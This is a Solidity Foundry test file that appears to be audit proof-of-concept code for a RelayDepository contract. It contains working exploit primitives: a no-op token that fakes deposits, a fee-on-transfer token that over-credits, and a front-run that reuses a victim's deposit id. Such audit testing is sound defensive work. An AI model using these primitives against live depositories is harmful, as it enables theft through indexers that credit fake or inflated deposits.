// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import {Test} from "forge-std/Test.sol";
import {RelayDepository} from "depository/RelayDepository.sol";

/// @notice Token whose transferFrom is a no-op that returns true.
/// Models a broken / malicious token (or, equivalently, an EOA "token":
/// a call to an EOA succeeds with empty returndata, which Solady's
/// SafeTransferLib also treats as success).
contract NoOpToken {
    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }
}

/// @notice ERC20 with a 10% fee on every transfer (fee burned).
contract FeeOnTransferToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "allowance");
            allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        uint256 fee = amount / 10;
        balanceOf[to] += amount - fee;
        totalSupply -= fee;
    }
}

contract DepositAccountingTest is Test {
    RelayDepository depository;
    NoOpToken noop;
    FeeOnTransferToken fot;

    address attacker = address(0xA77ACC);
    address owner = address(0x0);
    address allocator = address(0xA110CA);

    event RelayErc20Deposit(address from, address token, uint256 amount, bytes32 id);

    function setUp() public {
        owner = address(this);
        depository = new RelayDepository(owner, allocator);
        noop = new NoOpToken();
        fot = new FeeOnTransferToken();
        fot.mint(attacker, 10_000 ether);
    }

    /// @notice F1a: a deposit "succeeds" and emits a deposit event for a token
    /// that moved NOTHING. The depository never verifies receipt.
    function test_fakeDeposit_noOpToken() public {
        bytes32 id = keccak256("fake-1");
        uint256 fakeAmount = 1_000_000 ether;

        vm.expectEmit(true, true, false, true, address(depository));
        emit RelayErc20Deposit(attacker, address(noop), fakeAmount, id);

        vm.prank(attacker);
        depository.depositErc20(attacker, address(noop), fakeAmount, id);

        assertEq(noop.balanceOf(address(depository)), 0, "depository received nothing");
    }

    /// @notice Negative control: an EOA as the "token" is REJECTED by the
    /// depository's newer Solady (extcodesize check in safeTransferFrom).
    /// The fake-deposit primitive therefore needs a *contract* token (see
    /// test_fakeDeposit_noOpToken), not a bare EOA.
    function test_fakeDeposit_eoaToken_reverts() public {
        address eoaToken = address(0xE0A7);
        bytes32 id = keccak256("fake-2");

        vm.prank(attacker);
        vm.expectRevert(bytes4(0x7939f424)); // TransferFromFailed()
        depository.depositErc20(attacker, eoaToken, 1_000_000 ether, id);
    }

    /// @notice F1c: fee-on-transfer token — the event claims the nominal
    /// amount while the depository receives 10% less. An off-chain indexer
    /// crediting the event amount over-credits the depositor every cycle.
    function test_fotDeposit_overcredited() public {
        bytes32 id = keccak256("fot-1");
        uint256 amount = 1_000 ether;

        vm.prank(attacker);
        fot.approve(address(depository), amount);

        vm.expectEmit(true, true, false, true, address(depository));
        emit RelayErc20Deposit(attacker, address(fot), amount, id);

        vm.prank(attacker);
        depository.depositErc20(attacker, address(fot), amount, id);

        assertEq(
            fot.balanceOf(address(depository)),
            900 ether,
            "depository received only 900, event claims 1000"
        );
    }

    /// @notice F3: deposit ids are not unique on-chain. Two deposits with the
    /// same id (and same depositor) both succeed and emit indistinguishable
    /// events, so an off-chain indexer that dedupes by id can be griefed by a
    /// 0-value front-run deposit reusing the victim's id.
    function test_duplicateDepositId_bothSucceed() public {
        bytes32 id = keccak256("victim-deposit-id");
        uint256 amount = 100 ether;

        vm.prank(attacker);
        fot.approve(address(depository), amount);

        // Attacker front-runs with a 0-value deposit reusing the victim's id.
        vm.prank(attacker);
        depository.depositErc20(attacker, address(fot), 0, id);

        // Victim's real deposit with the same id still succeeds on-chain...
        vm.prank(attacker);
        depository.depositErc20(attacker, address(fot), amount, id);

        // ...but off-chain, the id was already seen: the second event is a
        // duplicate of an id the indexer already processed.
        assertEq(fot.balanceOf(address(depository)), 90 ether);
    }
}
